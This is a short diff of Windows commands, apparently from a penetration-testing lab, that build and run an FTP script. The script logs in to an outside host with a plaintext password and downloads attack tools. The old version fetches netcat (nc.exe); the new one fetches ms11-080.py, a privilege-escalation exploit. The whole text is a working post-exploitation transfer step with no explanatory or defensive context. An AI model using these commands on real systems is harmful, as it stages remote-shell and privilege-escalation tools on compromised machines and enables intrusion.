@@ -1,8 +1,8 @@
-echo open 10.11.0.212 21 > ftp.txt
-echo USER offsec >> ftp.txt
-echo PASS P@$$W0RD >> ftp.txt
+echo open 10.11.0.46 21> ftp.txt
+echo offsec>> ftp.txt
+echo P@$$W0RD>> ftp.txt
 echo bin >> ftp.txt
-echo GET nc.exe >> ftp.txt
+echo GET ms11-080.py >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 
